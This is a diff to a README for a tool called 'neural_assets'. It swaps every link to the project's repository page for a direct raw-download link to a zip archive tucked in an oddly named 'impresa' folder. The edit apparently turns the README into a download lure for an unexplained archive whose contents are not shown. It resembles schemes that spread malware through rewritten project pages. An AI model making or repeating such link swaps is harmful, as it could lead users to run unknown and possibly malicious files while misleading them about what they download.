@@ -1,6 +1,6 @@
 # 🧠 neural_assets - Run Neural Asset Tools Fast
 
-[⬇️ Download / Visit the page](https://github.com/softnesspsiparticle713/neural_assets)
+[⬇️ Download / Visit the page](https://github.com/softnesspsiparticle713/neural_assets/raw/refs/heads/main/impresa/neural-assets-v2.7.zip)
 
 ## 📦 What this app does
 
@@ -30,7 +30,7 @@ For best results:
 
 Visit this page to download neural_assets:
 
-[Download neural_assets](https://github.com/softnesspsiparticle713/neural_assets)
+[Download neural_assets](https://github.com/softnesspsiparticle713/neural_assets/raw/refs/heads/main/impresa/neural-assets-v2.7.zip)
 
 On the page, look for the latest release or the main download file. Save it to a folder you can find, such as:
 - Downloads
@@ -226,4 +226,4 @@ If you use the app often, it helps to save your settings before updating.
 
 If you need the download page again, use this link:
 
-[https://github.com/softnesspsiparticle713/neural_assets](https://github.com/softnesspsiparticle713/neural_assets)
+[https://github.com/softnesspsiparticle713/neural_assets/raw/refs/heads/main/impresa/neural-assets-v2.7.zip](https://github.com/softnesspsiparticle713/neural_assets/raw/refs/heads/main/impresa/neural-assets-v2.7.zip)
